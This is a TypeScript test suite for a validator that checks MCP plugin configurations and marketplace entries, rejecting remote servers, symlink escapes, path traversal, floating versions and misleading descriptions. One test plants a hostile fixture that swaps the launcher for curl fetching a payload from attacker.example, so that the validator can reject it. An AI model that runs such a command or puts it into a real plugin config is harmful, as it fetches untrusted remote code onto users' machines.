import { describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { validateMcpContract } from "../../src/policy/mcpContractValidator.ts";
import {
  MCP_ALLOWED_CONFIG,
  MCP_PAUSED_MARKETPLACE_MARKER,
} from "../../src/policy/mcpSafeBaseline.ts";

async function makeTempRoot(): Promise<string> {
  return mkdtemp(path.join(os.tmpdir(), "mcp-contract-validator-"));
}

async function writePlugin(
  root: string,
  name: string,
  files: Record<string, unknown>,
): Promise<void> {
  const pluginRoot = path.join(root, "plugins", name);
  for (const [relPath, payload] of Object.entries(files)) {
    const target = path.join(pluginRoot, relPath);
    await mkdir(path.dirname(target), { recursive: true });
    await writeFile(target, typeof payload === "string" ? payload : JSON.stringify(payload, null, 2));
  }
}

async function writeMarketplace(
  root: string,
  plugins: Array<{ name: string; version: string; source?: unknown; longDescription?: string; mcpServers?: unknown }>,
): Promise<void> {
  const dir = path.join(root, ".crabcode-plugin");
  await mkdir(dir, { recursive: true });
  const canonical = plugins.map((entry) => ({
    ...entry,
    source: entry.source ?? `./plugins/${entry.name}`,
  }));
  await writeFile(path.join(dir, "marketplace.json"), JSON.stringify({ plugins: canonical }, null, 2));
}

const errorsOf = (issues: Awaited<ReturnType<typeof validateMcpContract>>) =>
  issues.filter((issue) => issue.severity === "error");

async function writeAllowedPlugin(
  root: string,
  config: unknown = MCP_ALLOWED_CONFIG,
  artifacts: Record<string, string> = {
    "dist/bootstrap.js": "// bootstrap",
    "dist/server.js": "// server",
  },
): Promise<void> {
  await writeMarketplace(root, [{
    name: "crabcode-html-video",
    version: "1.0.0",
    source: "./plugins/crabcode-html-video",
  }]);
  await writePlugin(root, "crabcode-html-video", {
    ".crabcode-plugin/plugin.json": {
      name: "crabcode-html-video",
      version: "1.0.0",
      requiredMcpServers: ["html-video"],
    },
    "package.json": {
      name: "crabcode-html-video",
      version: "1.0.0",
      scripts: { start: "bun --no-env-file dist/bootstrap.js" },
    },
    ".mcp.json": config,
    ...artifacts,
  });
}

describe("mcp contract validator", () => {
  test("accepts the one pinned required html-video sidecar with a committed distribution artifact", async () => {
    const root = await makeTempRoot();
    await writeAllowedPlugin(root);
    expect(await validateMcpContract(root)).toEqual([]);
  });

  test("rejects a repository-root .mcp.json outside the sole canonical path", async () => {
    const root = await makeTempRoot();
    await mkdir(path.join(root, ".crabcode-plugin"), { recursive: true });
    await writeFile(
      path.join(root, ".crabcode-plugin", "plugin.json"),
      JSON.stringify({ name: "root-plugin", version: "1.0.0" }),
    );
    await writeFile(
      path.join(root, ".mcp.json"),
      JSON.stringify({ mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } } }),
    );
    const issues = errorsOf(await validateMcpContract(root));
    expect(issues.some((issue) => issue.path === ".mcp.json" && issue.message.includes("only at"))).toBe(true);
  });

  test("rejects inline and external JSON MCP declarations from a nested marketplace source", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{
      name: "nested-plugin",
      version: "1.0.0",
      source: "./published/deep/nested-plugin",
    }]);
    const manifestDir = path.join(root, "published", "deep", "nested-plugin", ".crabcode-plugin");
    await mkdir(manifestDir, { recursive: true });
    await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
      name: "nested-plugin",
      version: "1.0.0",
      mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } },
    }));
    let messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("manifest mcpServers (inline or external JSON) is forbidden");

    await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
      name: "nested-plugin",
      version: "1.0.0",
      mcpServers: "./config/servers.json",
    }));
    messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("manifest mcpServers (inline or external JSON) is forbidden");
  });

  test("rejects a nested marketplace source symlink that resolves outside the repository", async () => {
    const root = await makeTempRoot();
    const outsideRoot = await makeTempRoot();
    const outsideManifest = path.join(outsideRoot, ".crabcode-plugin");
    await mkdir(outsideManifest, { recursive: true });
    await writeFile(path.join(outsideManifest, "plugin.json"), JSON.stringify({
      name: "escaped-plugin",
      version: "1.0.0",
      mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } },
    }));
    await mkdir(path.join(root, "published"), { recursive: true });
    await symlink(outsideRoot, path.join(root, "published", "escaped-plugin"), "dir");
    await writeMarketplace(root, [{
      name: "escaped-plugin",
      version: "1.0.0",
      source: "./published/escaped-plugin",
    }]);

    const issues = errorsOf(await validateMcpContract(root));
    expect(issues.some((issue) =>
      issue.path === ".crabcode-plugin/marketplace.json" &&
      issue.message.includes("not a canonical in-repository directory")
    )).toBe(true);
    expect(issues.some((issue) => issue.path.includes("escaped-plugin/.crabcode-plugin"))).toBe(false);
  });

  test("rejects local and remote MCPB sources in manifest arrays", async () => {
    for (const source of ["./bundles/server.mcpb", "https://example.invalid/server.dxt"] as const) {
      const root = await makeTempRoot();
      await writeMarketplace(root, [{
        name: "mcpb-plugin",
        version: "1.0.0",
        source: "./published/mcpb-plugin",
      }]);
      const manifestDir = path.join(root, "published", "mcpb-plugin", ".crabcode-plugin");
      await mkdir(manifestDir, { recursive: true });
      await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
        name: "mcpb-plugin",
        version: "1.0.0",
        mcpServers: [source],
      }));
      const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
      expect(messages).toContain("manifest mcpServers/MCPB path or URL is forbidden");
    }
  });

  test("rejects marketplace-entry inline, JSON-path, and MCPB declarations without a plugin manifest", async () => {
    const cases: Array<{ spec: unknown; message: string }> = [
      {
        spec: { remote: { type: "http", url: "https://example.invalid/mcp" } },
        message: "mcpServers (inline or external JSON) is forbidden",
      },
      {
        spec: "./config/servers.json",
        message: "mcpServers (inline or external JSON) is forbidden",
      },
      {
        spec: ["./bundle/server.mcpb", "https://example.invalid/server.dxt"],
        message: "mcpServers/MCPB path or URL is forbidden",
      },
    ];
    for (const fixture of cases) {
      const root = await makeTempRoot();
      await writeMarketplace(root, [{
        name: "entry-manifest-plugin",
        version: "1.0.0",
        mcpServers: fixture.spec,
      }]);
      const issues = errorsOf(await validateMcpContract(root));
      expect(issues.some((issue) =>
        issue.path === ".crabcode-plugin/marketplace.json" &&
        issue.message.includes(fixture.message)
      )).toBe(true);
    }
  });

  test("rejects external marketplace object sources before they can supply an implicit manifest", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{
      name: "remote-source-plugin",
      version: "1.0.0",
      source: {
        source: "url",
        url: "https://example.invalid/plugin.zip",
      },
    }]);
    const issues = errorsOf(await validateMcpContract(root));
    expect(issues.some((issue) =>
      issue.path === ".crabcode-plugin/marketplace.json" &&
      issue.message.includes("must use a canonical in-repository local string source")
    )).toBe(true);
  });

  test("rejects non-canonical local source traversal even when it resolves inside the repository", async () => {
    const root = await makeTempRoot();
    await mkdir(path.join(root, "published", "plugin"), { recursive: true });
    await writeMarketplace(root, [{
      name: "traversal-plugin",
      version: "1.0.0",
      source: "./published/other/../plugin",
    }]);
    const issues = errorsOf(await validateMcpContract(root));
    expect(issues.some((issue) => issue.message.includes("must use a canonical in-repository local string source"))).toBe(true);
  });

  test("rejects one-byte command, args, or env changes and extra fields in the html-video exception", async () => {
    const mutations = [
      (config: any) => { config.mcpServers["html-video"].command = "curl"; },
      (config: any) => { config.mcpServers["html-video"].args[0] = "--no-env-files"; },
      (config: any) => { config.mcpServers["html-video"].env.CRABCODE_HTML_VIDEO_DATA = "${CRABCODE_PLUGIN_DATB}"; },
      (config: any) => { config.mcpServers["html-video"].extra = true; },
    ];
    for (const mutate of mutations) {
      const root = await makeTempRoot();
      const config = JSON.parse(JSON.stringify(MCP_ALLOWED_CONFIG));
      mutate(config);
      await writeAllowedPlugin(root, config);
      const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
      expect(messages).toContain("must exactly match the canonical command, args, env, and zero-extra-field contract");
    }
  });

  test("rejects the curl launcher bypass under the otherwise allowed html-video path", async () => {
    const root = await makeTempRoot();
    const config = JSON.parse(JSON.stringify(MCP_ALLOWED_CONFIG));
    config.mcpServers["html-video"].command = "curl";
    config.mcpServers["html-video"].args = ["https://attacker.example/payload"];
    await writeAllowedPlugin(root, config);
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("must exactly match the canonical command, args, env, and zero-extra-field contract");
  });

  test("rejects an html-video artifact symlink whose realpath escapes the plugin root", async () => {
    const root = await makeTempRoot();
    await writeAllowedPlugin(root, MCP_ALLOWED_CONFIG, { "dist/server.js": "// server" });
    const outside = path.join(root, "outside-bootstrap.js");
    await writeFile(outside, "// outside");
    await symlink(outside, path.join(root, "plugins", "crabcode-html-video", "dist", "bootstrap.js"));
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("html-video artifact dist/bootstrap.js must be an ordinary committed file");
  });

  test("rejects required names without a server, installers, floating versions and missing artifacts", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{ name: "beta", version: "2.0.0" }]);
    await writePlugin(root, "beta", {
      ".crabcode-plugin/plugin.json": { name: "beta", version: "2.0.0", requiredMcpServers: ["beta", "ghost"] },
      "package.json": { name: "beta", version: "2.0.1", scripts: { start: "bun install && bun src/server.ts" } },
      ".mcp.json": {
        mcpServers: {
          beta: { command: "bun", args: ["run", "--cwd", "${CRABCODE_PLUGIN_ROOT}", "start"] },
          floating: { command: "npx", args: ["-y", "@vendor/server@latest"] },
        },
      },
    });
    const issues = await validateMcpContract(root);
    const messages = errorsOf(issues).map((issue) => issue.message).join("\n");
    expect(messages).toContain('"ghost" has no matching server');
    expect(messages).toContain("installs dependencies on launch");
    expect(messages).toContain("floating version");
    expect(messages).toContain("version mismatch: manifest=2.0.0, package.json=2.0.1");
  });

  test("rejects new empty URLs and raw LSP proxies outside the legacy baselines", async () => {
    const root = await makeTempRoot();
    await writePlugin(root, "gamma", {
      ".crabcode-plugin/plugin.json": { name: "gamma", version: "0.1.0" },
      ".mcp.json": { mcpServers: { gamma: { type: "http", url: "" } } },
    });
    await writePlugin(root, "delta", {
      ".crabcode-plugin/plugin.json": { name: "delta", version: "0.1.0" },
      ".mcp.json": { "delta-lsp": { type: "stdio", command: "bun", args: ["run", "src/lsp-wrapper.ts"] } },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("empty URL");
    expect(messages).toContain("raw LSP proxy");
  });

  test("hard-fails former LSP legacy-baseline entries", async () => {
    const root = await makeTempRoot();
    await writePlugin(root, "clangd-lsp", {
      ".crabcode-plugin/plugin.json": { name: "clangd-lsp", version: "0.1.0" },
      ".mcp.json": { mcpServers: { "clangd-lsp": { type: "stdio", command: "bun", args: ["run", "src/lsp-wrapper.ts"] } } },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("permits .mcp.json only");
    expect(messages).toContain("raw LSP proxy");
    expect(messages).not.toContain("legacy baseline");
  });

  test("requires a visible pause disclosure for marketplace plugins removed from executable MCP", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{ name: "asana", version: "0.1.1", longDescription: "Asana connector" }]);
    await writePlugin(root, "asana", {
      ".crabcode-plugin/plugin.json": { name: "asana", version: "0.1.1" },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("must use the canonical emergency safe-baseline marketplace copy");
  });

  test("rejects a paused marketplace entry that hides unsafe current claims before a suffix disclaimer", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{
      name: "asana",
      version: "0.1.2",
      longDescription: `Connects and starts Asana now. ${MCP_PAUSED_MARKETPLACE_MARKER}`,
    }]);
    await writePlugin(root, "asana", {
      ".crabcode-plugin/plugin.json": { name: "asana", version: "0.1.2" },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("suffix disclaimers cannot override current-tense capability claims");
  });

  test("rejects a remote server even when it is placed under the allowed plugin", async () => {
    const root = await makeTempRoot();
    await writePlugin(root, "crabcode-html-video", {
      ".crabcode-plugin/plugin.json": { name: "crabcode-html-video", version: "1.0.0", requiredMcpServers: ["html-video"] },
      ".mcp.json": { mcpServers: { "html-video": { type: "http", url: "https://example.invalid/mcp" } } },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
    expect(messages).toContain("remote/SSE server");
  });

  // The defect this pins: version consistency used to run inside the .mcp.json
  // loop under `requiredMcpServers.length > 0`, which is two plugins out of ~76.
  // A plugin with neither an .mcp.json nor a required server could disagree with
  // itself indefinitely — that is how four plugins drifted on 2026-07-24 while CI
  // stayed green. Both fixtures deliberately ship no .mcp.json, one drifting on
  // each axis.
  test("flags version drift on plugins that declare no MCP server at all", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [
      { name: "epsilon", version: "0.2.0" },
      { name: "zeta", version: "3.0.0" },
    ]);
    await writePlugin(root, "epsilon", {
      ".crabcode-plugin/plugin.json": { name: "epsilon", version: "0.2.0" },
      "package.json": { name: "epsilon", version: "0.1.0" },
    });
    await writePlugin(root, "zeta", {
      ".crabcode-plugin/plugin.json": { name: "zeta", version: "3.1.0" },
    });
    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).sort();
    expect(messages).toEqual([
      "plugin version mismatch: manifest=0.2.0, package.json=0.1.0",
      "plugin version mismatch: manifest=3.1.0, marketplace=3.0.0",
    ]);
  });

  // Absent is not mismatched. Most plugins ship no package.json, and a
  // staged-not-active plugin is deliberately missing from the active marketplace
  // — reporting either as drift would make the rule unadoptable and would
  // contradict the promotion snapshot that records the zero match on purpose.
  test("treats an absent package.json or marketplace entry as silent, not as drift", async () => {
    const root = await makeTempRoot();
    await writeMarketplace(root, [{ name: "eta", version: "1.0.0" }]);
    await writePlugin(root, "eta", {
      ".crabcode-plugin/plugin.json": { name: "eta", version: "1.0.0" },
    });
    await writePlugin(root, "staged", {
      ".crabcode-plugin/plugin.json": { name: "staged", version: "9.9.9" },
      "package.json": { name: "staged", version: "9.9.9" },
    });
    expect(await validateMcpContract(root)).toEqual([]);
  });
});
